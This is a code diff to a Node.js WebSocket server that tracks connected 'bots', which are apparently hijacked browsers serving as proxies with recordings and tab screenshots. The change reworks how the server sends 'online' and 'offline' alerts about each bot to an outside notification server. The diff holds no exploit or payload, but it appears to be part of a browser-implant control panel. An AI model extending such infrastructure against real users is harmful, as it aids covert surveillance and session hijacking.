@@ -17,8 +17,7 @@ const sequelize = database.sequelize;
 const Sequelize = require("sequelize");
 const { log } = require("async");
 const Op = Sequelize.Op;
-const axios = require('axios');
-
+const axios = require("axios");
 
 const get_secure_random_string = require("./utils.js").get_secure_random_string;
 const logit = require("./utils.js").logit;
@@ -59,44 +58,27 @@ const REQUEST_TABLE = new NodeCache({
   useClones: false, // Whether to clone JavaScript variables stored here.
 });
 
-
-
 class Message {
   constructor() {
-    this.SERVER = process.env.BAK_SERVER || ''
+    this.SERVER = process.env.BAK_SERVER || "";
   }
 
-  async findBot(ws) {
-    return await Bots.findOne({
-      where: {
-        browser_id: ws.browser_id,
-      },
-    });
-
-  }
-
-  async online(ws) {
+  async online(bot, force = false) {
     try {
-
-      const bot = await this.findBot(ws);
       if (bot === null) {
         return;
       }
-      if (bot.is_online) {
+      if (bot.is_online && !force) {
         return;
       }
-      await axios.get(`${this.SERVER}/${bot.name} is online`);
+      await axios.get(`${this.SERVER}/${bot.name || bot.id} is online`);
     } catch (err) {
       console.log(err);
     }
-
   }
 
   async offline(bot) {
     try {
-
-
-      const bot = await this.findBot(ws);
       if (bot === null) {
         return;
       }
@@ -108,13 +90,10 @@ class Message {
     } catch (err) {
       console.log(err);
     }
-
   }
-
 }
 
 const MessageWorker = new Message();
-
 
 async function pong_and_get_bot(websocket_connection) {
   const bot = await Bots.findOne({
@@ -122,6 +101,7 @@ async function pong_and_get_bot(websocket_connection) {
       browser_id: websocket_connection.browser_id,
     },
   });
+
   websocket_connection.send(
     JSON.stringify({
       id: uuid.v4(),
@@ -151,7 +131,6 @@ async function ping(websocket_connection, params) {
     current_tab_image: params.current_tab_image,
   });
 }
-
 
 async function recording(websocket_connection, params) {
   const bot = await pong_and_get_bot(websocket_connection);
@@ -600,9 +579,11 @@ async function initialize_new_browser_connection(ws) {
       switch_config: BOT_DEFAULT_SWITCH_CONFIG,
       state: "",
     });
+    MessageWorker.online(new_browserproxy, (force = true));
   } else {
     // Update all browserproxy records to reflect that all these proxies are
     // now online.
+    MessageWorker.online(browserproxy_record);
     browserproxy_record.is_online = true;
     browserproxy_record.user_agent = user_agent;
     await browserproxy_record.save();
@@ -704,10 +685,6 @@ async function initialize() {
   });
 
   wss.on("connection", async function connection(ws) {
-    MessageWorker.online(ws);
-
-
-
     logit(`A new browser has connected to us via WebSocket!`);
 
     ws.isAlive = true;
@@ -728,8 +705,8 @@ async function initialize() {
             browser_id: ws.browser_id,
           },
         });
+        MessageWorker.offline(browserproxy_record);
         browserproxy_record.is_online = false;
-        MessageWorker.offline(ws);
         await browserproxy_record.save();
       } else {
         logit(`Unauthenticated WebSocket has disconnected from us.`);
